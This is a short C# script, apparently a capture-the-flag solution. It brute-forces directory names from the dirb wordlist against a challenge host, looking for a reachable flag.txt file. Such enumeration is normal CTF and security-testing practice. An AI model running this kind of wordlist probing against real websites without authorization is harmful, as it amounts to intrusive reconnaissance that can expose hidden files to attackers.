using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        var wordlist = File.ReadAllLines(@"/usr/share/wordlists/dirb/small.txt");

        var h = new HttpClient();

        foreach (var dir in wordlist)
        {
            var uri = $"http://rsxc.no:20023/{dir}/flag.txt";
            var r = await h.GetAsync(uri);

            if (r.StatusCode == HttpStatusCode.OK)
            {
                var s = await r.Content.ReadAsStringAsync();

                if (s != "404 - File not found")
                {
                    Console.WriteLine($"URI: {uri}");
                    Console.WriteLine($"s: {s}");
                    break;
                }
            }
            else
            {
                //r.StatusCode.Dump();
            }
        }
    }
}